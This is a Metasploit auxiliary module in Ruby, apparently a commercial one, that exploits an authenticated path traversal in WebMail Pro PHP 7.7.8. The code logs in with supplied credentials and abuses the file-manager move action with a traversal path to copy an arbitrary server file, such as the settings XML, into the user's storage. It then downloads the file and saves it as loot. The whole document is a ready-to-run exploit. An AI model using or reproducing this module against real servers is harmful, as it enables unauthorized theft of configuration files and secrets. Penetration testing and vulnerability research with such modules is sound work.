##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WebMail Pro PHP Authenticated Arbitrary File Read',
      'Description'    => %q{
    This module exploits an authenticated arbitrary file read vulnerability
    in WebMail Pro PHP.

    Version 7.7.8 and likely prior of WebMail Pro PHP suffered from a path traversal
    vulnerability in the file manager of the web application. This vulnerability
    allows an authenticated attacker to read arbitrary files from the file system,
    including sensitive configuration files. Fixed in 7.7.9.

    Categories: Enterprise

    Price: 4

    Video: https://asciinema.org/a/6SehBLh8FJ2hPhPMBiVNIjVkW

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => 'Jan 16 2018'
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptString.new('EMAIL', [true, 'The username to authenticate with', 'john@bitnami.afterlogic.com']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'password']),
        OptString.new('FILE', [true, 'The relative file path to read', '../../../../data/settings/settings.xml'])
      ], self.class)
  end

  def check
    Msf::Exploit::CheckCode::Safe
  end

  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/?/Ajax/'),
      'method' => 'POST',
      'vars_post' => {
        'Action' => 'SystemLogin',
        'Email' => datastore['EMAIL'],
        'IncPassword' => datastore['PASSWORD']
      }
    })

    if res && res.body =~ /"Result":false/
      fail_with(Failure::Unknown, "Authentication failed")
    end

    cookies = res.get_cookies
    token = JSON.parse(res.body)["Result"]["AuthToken"]
    acct_id = JSON.parse(res.body)["AccountID"]

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/?/Ajax/'),
      'method' => 'POST',
      'vars_post' => {
        'Action' => 'FilesMove',
        'FromType' => 'personal',
        'ToType' => 'personal',
        'FromPath' => '',
        'ToPath' => '/',
        'Files' => '[{"Name":"'+datastore['FILE']+'","IsFolder":false,"Size":302632}]',
        'AccountID' => acct_id,
        'Token' => token
      },
      'cookie' => cookies
    })

    unless res && res.body =~ /"Result":true/
      fail_with(Failure::Unknown, "Unable to copy file")
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/?/Ajax/'),
      'method' => 'POST',
      'vars_post' => {
        'Action' => 'Files',
        'Type' => 'personal',
        'Path' => '/',
        'Pattern' => '',
        'Token' => token
      },
      'cookie' => cookies
    })

    files = JSON.parse(res.body)
    e = File.extname(datastore['FILE'])
    f = File.basename(datastore['FILE'], e)
    hash = ''
    name = ''
    files['Result']['Items'].each do |item|
      if e != ''
        if item['Name'] =~ /#{f}_\d#{e}/
          hash = item['Hash']
          name = item['Name']
        end
      else
        if item['Name'] =~ /#{f}_\d/
          hash = item['Hash']
        end
      end
    end

    res = send_request_cgi({
      'uri' => target_uri.path + '?/Raw/FilesDownload//'+hash+'//',
      'cookie' => cookies
    })

    path = store_loot('webmail_pro.file.'+name, 'text/plain', datastore['RHOST'], res.body)

    print_good("File saved to path: " + path)
  end
end

